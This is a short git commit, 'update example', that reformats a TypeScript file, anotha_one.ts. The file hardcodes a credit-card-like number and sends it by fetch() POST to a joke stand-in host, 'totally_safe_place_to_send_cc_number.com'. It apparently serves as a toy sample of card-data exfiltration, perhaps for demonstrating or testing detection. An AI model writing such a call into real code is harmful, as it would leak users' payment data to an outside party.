7dc7461b1363f80b8052a0de45cc7a0e488e8972
TheAndrewJackson <andrew.c.j1995@gmail.com>
2023-12-22 15:02:38 -0500

    update example

--- anotha_one.ts
+++ anotha_one.ts
@@ -2,9 +2,4 @@ const credit_card = "4444 2222 7898 4567"
 
 
 
-fetch("http://www.totally_safe_place_to_send_cc_number.com/payment",{
-  method: "POST"
-  body: {
-    credit_card
-  }
-})
+fetch("http://www.totally_safe_place_to_send_cc_number.com/payment",{ method: "POST",body: { credit_card }})
